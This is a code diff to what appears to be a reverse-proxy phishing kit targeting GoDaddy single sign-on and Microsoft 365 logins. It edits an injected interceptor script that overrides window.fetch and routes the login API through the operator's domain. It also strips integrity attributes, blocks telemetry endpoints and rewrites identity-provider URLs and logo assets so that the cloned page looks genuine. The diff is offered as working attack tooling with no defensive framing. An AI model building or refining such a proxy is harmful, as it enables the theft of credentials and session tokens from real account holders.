@@ -107,7 +107,7 @@ function generateInterceptorScript(upstreamDomain) {
   function rewriteUrl(url) {
     if (!url || typeof url !== 'string') return url;
 
-    // Aggressive tracking block
+    // Block noisy tracking requests early
     if (/eventbus\/web|rum\/events|apm\//.test(url)) {
       console.log('[Proxy Interceptor] Blocked tracking:', url);
       return 'about:blank';
@@ -120,21 +120,23 @@ function generateInterceptorScript(upstreamDomain) {
       if (url.startsWith('http')) u = new URL(url);
       else if (url.startsWith('//')) u = new URL('https:' + url);
       else if (url.startsWith('/')) {
-        // Force all GoDaddy paths through proxy
+        // Force GoDaddy trust-center, media, and login API through full proxy
         if (url.includes('trust-center') || url.includes('_next/static/media') || url.includes('/v1/api/pass/login')) {
+          console.log('[Proxy Interceptor] Forced proxy for GoDaddy asset:', url);
           return 'https://' + PROXY_DOMAIN + PROXY_PREFIX + 'sso.godaddy.com' + url;
         }
         return 'https://' + PROXY_DOMAIN + PROXY_PREFIX + UPSTREAM + url;
       }
 
-      if (u && (shouldProxyDomain(u.hostname) || u.hostname.includes('godaddy'))) {
+      if (u && (shouldProxyDomain(u.hostname) || u.hostname.includes('godaddy') || u.pathname.includes('trust-center'))) {
+        console.log('[Proxy Interceptor] Rewrote:', url);
         return 'https://' + PROXY_DOMAIN + PROXY_PREFIX + u.hostname + u.pathname + u.search + u.hash;
       }
     } catch(e) {}
     return url;
   }
 
-  // Fetch override (most important for login POST)
+  // Fetch override (critical for login POST)
   const origFetch = window.fetch;
   window.fetch = function(resource, init) {
     const rewritten = typeof resource === 'string' ? rewriteUrl(resource) : resource;
@@ -237,38 +239,37 @@ export default async function handleRequest(request) {
         text = text.replace(/<(script|link)[^>]*?\s+integrity=["'][^"']*["'][^>]*>/gi, m => m.replace(/\s+integrity=["'][^"']*["']/i, ''));
       }
 
-      // === IMPROVED URL REWRITING ===
-
-      // 1. Trust-center logo fix (most important)
+      // === STRONGER REWRITING FOR LOGO AND ASSETS ===
+      // Trust-center logo (m365.png)
       text = text.replace(
         /(src|href)=["']\/?trust-center\/_next\/static\/media\/([^"']+)["']/gi,
         `\$1="https://${YOUR_DOMAIN}${PROXY_PREFIX}sso.godaddy.com/trust-center/_next/static/media/$2"`
       );
 
-      // 2. General Next.js media
+      // General Next.js media
       text = text.replace(
         /(src|href)=["']\/_next\/static\/media\/([^"']+)["']/gi,
         `\$1="https://${YOUR_DOMAIN}${PROXY_PREFIX}sso.godaddy.com/_next/static/media/$2"`
       );
 
-      // 3. Root-relative paths
+      // Root-relative paths
       text = text.replace(/(src|href|action)=["']\/([^"']+)["']/gi, (match, attr, path) => {
         if (path.startsWith('_p/') || path.includes('data:') || path.startsWith('#')) return match;
         return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
       });
 
-      // 4. Cleanup
+      // Cleanup
       text = text.replace(/\/id-id\/godaddy-404/gi, '/');
       text = text.replace(/godaddy-404/gi, '');
 
-      // 5. Full domain rewriting
+      // Full domain rewriting
       Object.keys(IDENTITY_PROVIDERS).forEach(d => {
         const esc = d.replace(/\./g, '\\.');
         text = text.replace(new RegExp('https?://' + esc + '([^"\'\\s)]*)', 'gi'),
           `https://${YOUR_DOMAIN}${PROXY_PREFIX}${d}$1`);
       });
 
-      // 6. CSS url() fix (no more ur[] typo)
+      // CSS url()
       text = text.replace(/url\(["']?(https?:\/\/[^"')]+)["']?\)/gi, (match, fullUrl) => {
         try {
           const u = new URL(fullUrl);
